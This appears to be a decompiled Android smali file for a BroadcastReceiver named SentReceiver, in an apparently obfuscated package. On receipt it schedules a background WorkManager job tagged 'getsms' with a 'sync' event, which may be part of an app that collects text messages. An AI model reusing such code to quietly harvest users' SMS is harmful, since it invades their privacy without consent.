.class public Lgqegwqg/bbebebefff/asdcdsac/SentReceiver;
.super Landroid/content/BroadcastReceiver;
.source "sourcefile"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    const-string p2, "SentReceiver"

    const-string v0, "marking message as sent"

    invoke-static {p2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1
    invoke-static {p1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object p2

    const-string v0, "getsms"

    .line 2
    invoke-virtual {p2, v0}, Lg/z/u/l;->b(Ljava/lang/String;)Lg/z/m;

    .line 3
    new-instance p2, Ljava/util/HashMap;

    invoke-direct {p2}, Ljava/util/HashMap;-><init>()V

    const-string v1, "event"

    .line 4
    invoke-interface {p2, v1, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v1, "type"

    const-string v2, "sync"

    invoke-interface {p2, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 5
    new-instance v1, Lg/z/e;

    invoke-direct {v1, p2}, Lg/z/e;-><init>(Ljava/util/Map;)V

    invoke-static {v1}, Lg/z/e;->c(Lg/z/e;)[B

    .line 6
    new-instance p2, Lg/z/l$a;

    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-direct {p2, v2}, Lg/z/l$a;-><init>(Ljava/lang/Class;)V

    .line 7
    iget-object v2, p2, Lg/z/r$a;->b:Lg/z/u/s/o;

    iput-object v1, v2, Lg/z/u/s/o;->e:Lg/z/e;

    .line 8
    iget-object v1, p2, Lg/z/r$a;->c:Ljava/util/Set;

    invoke-interface {v1, v0}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    .line 9
    invoke-virtual {p2}, Lg/z/r$a;->a()Lg/z/r;

    move-result-object p2

    check-cast p2, Lg/z/l;

    .line 10
    invoke-static {p1}, Lg/z/u/l;->c(Landroid/content/Context;)Lg/z/u/l;

    move-result-object p1

    .line 11
    invoke-virtual {p1, p2}, Lg/z/q;->a(Lg/z/r;)Lg/z/m;

    return-void
.end method
